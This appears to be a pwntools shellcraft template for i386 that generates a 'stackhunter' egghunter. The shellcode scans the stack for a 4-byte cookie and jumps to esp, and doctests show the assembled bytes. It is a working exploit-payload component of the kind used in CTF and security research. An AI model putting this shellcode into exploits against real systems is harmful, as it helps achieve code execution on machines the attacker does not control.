<% from pwnlib.shellcraft import common %>
<%page args="cookie = 0xe4fffc75"/>
<%docstring>
    stackhunter(cookie = 0xe4fffc75)

    Returns an an egghunter, which searches from esp and upwards
    for a cookie. However to save bytes, it only looks at a single
    4-byte alignment. Use the function stackhunter_helper to
    generate a suitable cookie prefix for you.

    The default cookie has been chosen, because it makes it possible
    to shave two bytes, but other cookies can be used too.

Example:

    >>> with context.local(arch='i386'):
    ...    print(enhex(asm(shellcraft.stackhunter())))
    583d75fcffe4ebfa
    >>> with context.local(arch='i386'):
    ...    print(enhex(asm(shellcraft.stackhunter(0x7afceb58))))
    3d58ebfc7a75faffe4
    >>> with context.local(arch='i386'):
    ...    print(enhex(asm(shellcraft.stackhunter(0xdeadbeef))))
    583defbeadde75f8ffe4
</%docstring>
<% stackhunter = common.label("stackhunter") %>
${stackhunter}:
%if (cookie & 0xffffff) == 0xfceb58:
    cmp eax, ${'%#x' % cookie}
    jne ${stackhunter}+1
    jmp esp
%else:
    pop eax
    cmp eax, ${'%#x' % cookie}
%if cookie == 0xe4fffc75:
    jmp ${stackhunter}+2
%else:
    jne ${stackhunter}
    jmp esp
%endif
%endif
